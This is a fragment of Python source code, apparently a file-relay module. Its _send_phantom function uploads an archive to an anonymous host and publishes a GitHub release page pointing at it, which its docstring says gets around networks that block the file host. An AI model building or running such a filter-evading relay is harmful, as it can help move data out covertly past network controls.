        except (KeyError, TypeError, ValueError) as exc:
            raise RelayError("github returned no release page") from exc

        if not isinstance(page, str) or not page.startswith(("http://", "https://")):
            raise RelayError(f"github returned no url: {page!r}")
        return page

    raise RelayError(f"github refused a tag {_GH_TAG_ATTEMPTS} times")


def _send_phantom(endpoint: str, archive: Path, caption: str) -> None:
    """Host the archive, then publish a release page that points at it.

    This route exists for a filtered uplink. Catbox's download names are reset at
    the TLS layer on some networks while github.com answers normally, so the
    advertisement rides a name that resolves. Nothing about the file changes: the
    bytes still go to whichever anonymous host takes them.

    No webhook is posted. The release page is the delivery, the operator already
    holds the repository, and the run does not need a second credential to say so.
    """
    owner, name, token = _split_phantom(endpoint)
    url = _host_archive(archive)
    page = _gh_release(owner, name, token, archive, caption, url)
    log.logger.info("relay: %s published at %s", archive.name, page)


__all__ = ["Delivery", "RelayError", "deliver", "describe", "human_bytes", "notify", "transmit"]
